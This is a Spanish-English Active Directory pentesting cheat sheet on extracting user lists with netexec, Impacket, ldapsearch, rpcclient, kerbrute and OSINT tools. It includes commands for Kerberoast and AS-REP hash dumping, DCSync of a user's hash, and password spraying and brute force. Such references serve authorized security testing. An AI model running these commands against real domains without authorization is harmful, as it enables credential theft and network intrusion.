---
aliases:
  - "Generación de listas de usuarios"
  - "username-anarchy"
  - User List Dump
  - LDAP User Filter
  - SAMR enumdomusers
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Users Enumeration]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# AD - Users Enumeration - User List Extraction

---

## netexec — User Dumps

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --users` | Users via LDAP (rápido + atributos) | Standard. |
| `nxc smb <DC> -u u -p p --users` | Users via SAMR (RID brute) | Alt path SMB. |
| `nxc ldap <DC> -u u -p p --users-export users.txt` | Export users a file | Pipeline. |
| `nxc smb <DC> -u '' -p '' --users` | Users vía null bind | Test misconfig. |
| `nxc smb <DC> -u guest -p '' --users` | Fallback Guest | Si null blocked. |
| `nxc ldap <DC> -u u -p p --asreproastable` | Users con `DONT_REQ_PREAUTH` | AS-REP roast prep. |
| `nxc ldap <DC> -u u -p p --kerberoasting kerb.txt` | Users con SPN + dump TGS | Kerberoast prep. |
| `nxc ldap <DC> -u u -p p --admin-count` | Users con `adminCount=1` | Tier 0 enum. |
| `nxc ldap <DC> -u u -p p --password-not-required` | Users con `PASSWD_NOTREQD` | Vuln signal. |
| `nxc ldap <DC> -u u -p p --active-users` | Solo enabled accounts | Filter útil. |
| `nxc smb <DC> -u u -p p --rid-brute 10000` | RID brute extendido | Domain grande. |
| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(!(objectClass=computer)))" "samAccountName,userPrincipalName,lastLogonTimestamp"` | Custom LDAP query | Atributos específicos. |
^ad-userlist-netexec

```bash
# Pipeline post-foothold
DC=10.10.10.10
nxc ldap $DC -u user -p pass --users > users_ldap.txt
nxc ldap $DC -u user -p pass --asreproastable > asrep.txt
nxc ldap $DC -u user -p pass --kerberoasting kerb.hash
nxc ldap $DC -u user -p pass --admin-count > admins.txt
```

---

## Impacket — User Enumeration

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -outputfile users.csv` | Users + LastLogon CSV | Reportable. |
| `impacket-GetADUsers -all corp.local/u:p -dc-ip <DC> -no-pass -k` | Auth via TGT (Kerberos) | OPSEC sin password. |
| `impacket-lookupsid 'corp.local/u:p'@<DC> 10000` | RID brute via LSARPC | RIDs hasta 10000. |
| `impacket-lookupsid 'corp.local/'@<DC>` | Anonymous lookupsid | Si null permitido. |
| `impacket-samrdump corp.local/u:p@<DC>` | Detail completo via SAMR | Más info que GetADUsers. |
| `impacket-samrdump 'corp.local/'@<DC>` | Anonymous SAMR | Si null. |
| `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>` | AS-REP roastable check (sin auth) | Pre-auth disabled. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request` | Kerberoast bulk | TGS hashes. |
| `impacket-secretsdump corp.local/admin:pass@<DC> -just-dc-user <user>` | Hash de single user (DCSync) | Privileged targeted. |
^ad-userlist-impacket

```bash
# Pipeline Linux completo
impacket-GetADUsers -all corp.local/auditor:Pass! -dc-ip <DC> -outputfile users.csv

# RID brute filter solo users
impacket-lookupsid 'corp.local/auditor:Pass!'@<DC> 10000 |
  grep "SidTypeUser" |
  awk '{print $2}' | cut -d'\\' -f2 > users_clean.txt
```

---

## LDAP Direct (ldapsearch)

| **Comando / Filter** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch ... "(&(objectCategory=user)(!(objectClass=computer)))"` | Users excluyendo computers | Filter limpio. |
| `ldapsearch ... "(samAccountType=805306368)"` | User account type numérico | Alt filter. |
| `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=512)"` | NORMAL_ACCOUNT enabled | Active users. |
| `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=2)"` | Disabled accounts | Audit. |
| `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"` | DONT_REQ_PREAUTH (AS-REP roast) | Pre-attack. |
| `ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=32)"` | PASSWD_NOTREQD | Vuln signal. |
| `ldapsearch ... "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)"` | Direct members de DA | Tier 0. |
| `ldapsearch ... "(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,...)"` | Members recursivos (nested) | Tier 0 efectivo. |
| `ldapsearch ... "(servicePrincipalName=*)"` | Users con SPN | Kerberoast. |
| `ldapsearch -h <DC> -p 3268 ...` | GC port (forest-wide) | Cross-domain. |
| `ldapsearch -H ldaps://<DC> ...` | LDAPS encrypted | OPSEC. |
^ad-userlist-ldapsearch

```bash
LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"

# Active users con UPN + last logon
$LS "(&(objectCategory=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=512))" \
  samAccountName userPrincipalName lastLogonTimestamp

# Tier 0 efectivo (recursive)
$LS "(&(objectCategory=user)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local))" \
  samAccountName userPrincipalName

# Forest-wide via GC port
ldapsearch -h <DC> -p 3268 -D 'corp\\u' -w pass -b "" \
  "(&(objectCategory=user)(!(objectClass=computer)))" samAccountName
```

---

## RPC / SAMR Enumeration

| **Comando rpcclient** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `enumdomusers` | Users con RID | Standard. |
| `enumdomusers -1` | Verbose detail | Más info. |
| `queryuser <user-or-rid>` | Atributos del user (badPwdCount, lastLogon, etc) | Per-user detail. |
| `samlookupnames domain administrator` | Resolver nombre → SID | Targeted. |
| `samlookuprids domain 500` | Resolver RID → nombre | Reverse lookup. |
| `lsaenumsid` | LSA SID enum | Adjacent. |
| `getdompwinfo` | Password policy | Adjacent (spray prep). |
| `lsaquery` | Domain SID + name | Bootstrap. |
^ad-userlist-rpc

```bash
# Batch — anónimo
rpcclient -U "" <DC> -N -c 'lsaquery;enumdomusers;enumdomgroups;getdompwinfo'

# Authenticated con detalle por user
rpcclient -U 'corp\u%pass' <DC> -c 'enumdomusers' |
  awk -F'[][]' '{print $2}' |
  while read u; do
    rpcclient -U 'corp\u%pass' <DC> -c "queryuser $u" 2>/dev/null
  done
```

---

## Kerberos User Enumeration (kerbrute)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local users.txt` | Validar users vía Kerberos pre-auth | Sin creds. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt` | Output a file | Pipeline. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt --downgrade` | Forzar encryption downgrade | Edge. |
| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'Spring2026!'` | Spray después de validar | Post-enum. |
| `kerbrute bruteuser --dc <DC> -d corp.local pass.txt <user>` | Brute single user | Edge. |
^ad-userlist-kerbrute

**Cómo funciona:** envía AS-REQ. KDC responde:
- `KDC_ERR_PREAUTH_REQUIRED` → user **existe**.
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → user **NO existe**.

Sin necesidad de creds (solo AS-REQ).

```bash
# Generate usernames + validate
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy -i names.txt > usernames.txt

# O SecLists
cp /usr/share/seclists/Usernames/Names/names.txt usernames.txt

# Validate via Kerberos (rápido — ~1000/seg)
kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid_users.txt
```

---

## OSINT-Based User Discovery

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `linkedin2username -c "Target Company" -u atacante -p pass -n corp.local` | Usernames generados desde LinkedIn employees | Pre-engagement OSINT. |
| `dehashed -e <dom>` (CLI) | Emails del domain en breaches públicos | Patterns + creds históricos. |
| Manual scrape "Team" page del website | Names → patterns | Public OSINT. |
| `cewl https://corp.com -d 2 -m 5 -w companywords.txt` | Wordlist desde sitio público | Naming patterns. |
^ad-userlist-osint

```bash
# linkedin2username pipeline
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
python3 linkedin2username.py -c "Target Company" -u atacante -p pass -n corp.local

# Output:
#   first.last@corp.local
#   flast@corp.local
#   firstl@corp.local

# Validate con kerbrute
kerbrute userenum --dc <DC> -d corp.local linkedin_users.txt -o valid.txt
```

---
